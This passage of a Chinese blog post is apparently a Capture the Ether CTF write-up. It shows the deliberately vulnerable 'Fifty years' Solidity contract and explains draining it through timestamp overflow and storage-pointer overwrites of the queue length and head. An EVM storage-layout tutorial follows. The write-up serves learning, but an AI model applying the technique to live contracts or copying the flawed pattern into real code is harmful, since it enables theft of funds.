<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract FiftyYearsChallenge &#123;<br>    struct Contribution &#123;<br>        uint256 amount;<br>        uint256 unlockTimestamp;<br>    &#125;<br>    Contribution[] queue;<br>    uint256 head;<br><br>    address owner;<br>    function FiftyYearsChallenge(address player) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        owner = player;<br>        queue.push(Contribution(msg.value, now + 50 years));<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function upsert(uint256 index, uint256 timestamp) public payable &#123;<br>        require(msg.sender == owner);<br><br>        if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123;<br>            // Update existing contribution amount without updating timestamp.<br>            Contribution storage contribution = queue[index];<br>            contribution.amount += msg.value;<br>        &#125; else &#123;<br>            // Append a new contribution. Require that each contribution unlock<br>            // at least 1 day after the previous one.<br>            require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days);<br><br>            contribution.amount = msg.value;<br>            contribution.unlockTimestamp = timestamp;<br>            queue.push(contribution);<br>        &#125;<br>    &#125;<br><br>    function withdraw(uint256 index) public &#123;<br>        require(msg.sender == owner);<br>        require(now &gt;= queue[index].unlockTimestamp);<br><br>        // Withdraw this and any earlier contributions.<br>        uint256 total = 0;<br>        for (uint256 i = head; i &lt;= index; i++) &#123;<br>            total += queue[i].amount;<br><br>            // Reclaim storage.<br>            delete queue[i];<br>        &#125;<br><br>        // Move the head of the queue forward so we don&#x27;t have to loop over<br>        // already-withdrawn contributions.<br>        head = index + 1;<br><br>        msg.sender.transfer(total);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>分析：<br>第一点：如何解决50年的时间问题：这里的<code>unlockTimestamp</code>可以发生上溢从而归零。所以在upsert函数中通过设置<code>timestamp=0</code>可以将时间限制解除。于是需要对upsert进行两次调用，第一次将<code>unlockTimeStamp</code>设置为<code>+1days</code>就能发生溢出的极限值，第二次调用就可以绕过检查设置为0。<br>根据前面几题的经验可以看到在upsert函数中<code>contribution.amount</code>和<code>contribution.unlockTimestamp</code>都造成了变量覆盖：分别将<code>queue</code>的长度和<code>head</code>的值进行了覆盖。<br>实现：</p>
<ol>
<li>部署合约</li>
<li>进行第一次upsert调用，设置为时间溢出的极限值<br><img src="/2023/04/01/Capture-the-Ether/Fift_1.png"><del>这里应该设1wei，否则queue的length不够</del></li>
<li>进行第二次upsert调用，设置为0</li>
</ol>
<p><img src="/2023/04/01/Capture-the-Ether/Fift_2.png"><br>第一次调用中同时改变了head的值，index大于2不是硬性要求<br>4. 第三次进行withdraw调用<br><img src="/2023/04/01/Capture-the-Ether/Fift_3.png"></p>
<h1 id="以太坊的数据存储"><a href="#以太坊的数据存储" class="headerlink" title="以太坊的数据存储"></a>以太坊的数据存储</h1><p>对于固定大小的变量EVM会直接将他们按顺序从0开始存储在每个存储位中，每个存储位都是32字节（256bit），是一种键值对的形式。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity^0.8.10;<br><br>contract test&#123;<br>    uint256 public a=9;<br>    uint256[2] public b;<br>    address c;<br>    function t() public &#123;<br>        b[0] = 63;<br>        b[1] =96;<br>        c = msg.sender;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/2023/04/01/Capture-the-Ether/storage_structure_11.png"><br>这里就可以看到对于32字节固定长度的数据每个都占据一个key，key&#x3D;1对应变量a的存储位。key&#x3D;1，2对应变量b的两个存储位。相应的value便是变量的值。<br>因为在EVM中存储数据是需要消耗gas的，不论是永久的storage还是内存的memory只是消耗的gas量不同（storage比memory更昂贵），所以solidity里进行了一定的存储优化，简单来讲，即定义的这个变量所占的空间小于32个字节时，它所占据的这个存储位的空间可以与它后面的变量共享（当然前提是这个变量塞的下去）因为在EVM里将数据写入一个新位置和写入一个已经分配出来的位置所需的gas是不一样的。</p>
<p><code>uint16 public d=12;  uint16 public g=8;  bytes16 public name=&quot;lex&quot;;</code><br><img src="/2023/04/01/Capture-the-Ether/storage_structure_12.png"><br>可以看到上面三个变量占用了同一个存储位key&#x3D;0，但占 用着空间的不同位置。实现了存储的共享<br>对于动态数据的存储，有着自己的计算规则：<code>keccak256(bytes32(key)+bytes32(position))</code>此处的key为映射的key，position则是定义变量的位置。根据此式我们可以算出变量存储位置</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/02/25/Ether/">Ethernaut Prev →</a></div></div></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="INDEX">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Lexlady</a></h1><div id="description"></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Lotteries"><span class="toc-number">1.</span> <span class="toc-text">Lotteries</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess-Number"><span class="toc-number">1.1.</span> <span class="toc-text">Guess Number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Secret-Number"><span class="toc-number">1.2.</span> <span class="toc-text">The Secret Number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Randon-Number"><span class="toc-number">1.3.</span> <span class="toc-text">The Randon Number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-New-Number"><span class="toc-number">1.4.</span> <span class="toc-text">The New Number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Predict-the-future"><span class="toc-number">1.5.</span> <span class="toc-text">Predict the future</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Predict-the-block-hash"><span class="toc-number">1.6.</span> <span class="toc-text">Predict the block hash</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Token-sale"><span class="toc-number">2.</span> <span class="toc-text">Token sale</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Token-Whale"><span class="toc-number">3.</span> <span class="toc-text">Token Whale</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Retirement-fund"><span class="toc-number">4.</span> <span class="toc-text">Retirement fund</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Mapping"><span class="toc-number">5.</span> <span class="toc-text">Mapping</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Donation"><span class="toc-number">6.</span> <span class="toc-text">Donation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fifty-years"><span class="toc-number">7.</span> <span class="toc-text">Fifty years</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%9A%84%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8"><span class="toc-number">8.</span> <span class="toc-text">以太坊的数据存储</span></a></li></ol></div></div></div><footer><nobr>published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>